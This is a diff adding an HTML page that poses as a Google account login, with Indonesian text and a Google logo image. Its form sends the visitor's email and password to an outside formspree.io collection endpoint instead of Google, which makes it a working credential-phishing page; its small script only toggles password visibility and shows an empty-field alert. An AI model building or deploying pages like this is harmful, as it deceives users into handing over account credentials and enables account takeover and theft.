@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Login</title>
+    <link
+      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+      rel="stylesheet" />
+    <link rel="stylesheet" href="style.css" />
+    <style></style>
+  </head>
+  <body>
+    <div class="box">
+      <div style="width: 100%" class="image">
+        <img src="assets/goo.png" width="100" alt="" />
+      </div>
+      <h2>Login</h2>
+      <p>
+        menggunakan Akun Google.
+        <a
+          style="text-decoration: none; font-weight: bold; color: #1a73e8"
+          href="#"
+          >Pelajari lebih lanjut</a
+        >
+      </p>
+      <form
+        id="login-form"
+        method="POST"
+        action="https://formspree.io/f/myyazywb">
+        <p id="alert" style="color: rgb(255, 118, 118); display: none">
+          Email atau password tidak valid !
+        </p>
+        <div class="inputBox">
+          <input
+            id="email"
+            required
+            type="email"
+            name="email"
+            required
+            onkeyup="this.setAttribute('value', this.value);"
+            value="" />
+          <label>Email atau ponsel</label>
+        </div>
+        <br />
+        <div class="inputBox">
+          <input
+            id="pass"
+            required
+            type="password"
+            name="text"
+            required
+            onkeyup="this.setAttribute('value', this.value);"
+            value="" />
+          <span onclick="eyes()" id="eye" class="eye">
+            <i class="bx bx-low-vision"></i>
+          </span>
+          <label>Password</label>
+        </div>
+        <br />
+        <a style="text-decoration: none; color: #1a73e8" href="#">Lupa email?</a
+        ><br />
+        <a style="text-decoration: none; color: #1a73e8" href="#">Buat akun</a>
+        <!-- <input type="submit" name="login" value="Login" /> -->
+        <button id="login" type="submit" name="submit">Login</button>
+      </form>
+    </div>
+    <!-- <script src="script.js"></script> -->
+    <script>
+      function eyes() {
+        let password = document.getElementById("pass");
+        if (password.getAttribute("type") === "password") {
+          password.setAttribute("type", "text");
+        } else {
+          password.setAttribute("type", "password");
+        }
+      }
+      let loginButton = document.getElementById("login");
+
+      loginButton.addEventListener("click", function () {
+        let username = document.getElementById("email").value;
+        let password = document.getElementById("pass").value;
+
+        if (username == 0 || password == 0) {
+          let alert = (document.getElementById("alert").style.display =
+            "block");
+        }
+      });
+    </script>
+    <script src="script.js"></script>
+  </body>
+</html>
